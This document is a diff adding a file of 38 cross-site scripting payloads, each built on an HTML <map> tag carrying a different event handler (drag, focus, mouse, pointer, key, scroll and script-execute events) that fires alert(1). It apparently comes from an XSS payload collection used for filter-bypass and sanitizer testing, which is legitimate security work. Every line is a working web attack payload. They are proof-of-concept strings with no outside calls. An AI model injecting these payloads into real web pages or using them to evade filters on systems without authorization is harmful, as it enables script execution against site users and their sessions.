@@ -1,0 +1,38 @@
+<map contenteditable onbeforeinput=alert(1)>test
+<map draggable="true" ondrag="alert(1)" style=display:block>test</map>
+<map draggable="true" ondragend="alert(1)" style=display:block>test</map>
+<map draggable="true" ondragenter="alert(1)" style=display:block>test</map>
+<map draggable="true" ondragleave="alert(1)" style=display:block>test</map>
+<map draggable="true" ondragstart="alert(1)" style=display:block>test</map>
+<map id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></map>
+<map id=x tabindex=1 onfocus=alert(1)></map>
+<map id=x tabindex=1 onfocusin=alert(1)></map>
+<map onafterscriptexecute=alert(1)><script>1</script>
+<map onbeforescriptexecute=alert(1)><script>1</script>
+<map onblur=alert(1) id=x tabindex=1 style=display:block>test</map><input value=clickme>
+<map onclick="alert(1)" style=display:block>test</map>
+<map oncontextmenu="alert(1)" style=display:block>test</map>
+<map oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<map oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
+<map ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</map>
+<map onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</map><input value=clickme>
+<map onkeydown="alert(1)" contenteditable style=display:block>test</map>
+<map onkeypress="alert(1)" contenteditable style=display:block>test</map>
+<map onkeyup="alert(1)" contenteditable style=display:block>test</map>
+<map onmousedown="alert(1)" style=display:block>test</map>
+<map onmouseenter="alert(1)" style=display:block>test</map>
+<map onmouseleave="alert(1)" style=display:block>test</map>
+<map onmousemove="alert(1)" style=display:block>test</map>
+<map onmouseout="alert(1)" style=display:block>test</map>
+<map onmouseover="alert(1)" style=display:block>test</map>
+<map onmouseup="alert(1)" style=display:block>test</map>
+<map onmousewheel=alert(1) style=display:block>requires scrolling
+<map onpointerdown=alert(1) style=display:block>XSS</map>
+<map onpointerenter=alert(1) style=display:block>XSS</map>
+<map onpointerleave=alert(1) style=display:block>XSS</map>
+<map onpointermove=alert(1) style=display:block>XSS</map>
+<map onpointerout=alert(1) style=display:block>XSS</map>
+<map onpointerover=alert(1) style=display:block>XSS</map>
+<map onpointerrawupdate=alert(1) style=display:block>XSS</map>
+<map onpointerup=alert(1) style=display:block>XSS</map>
+<map onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></map>
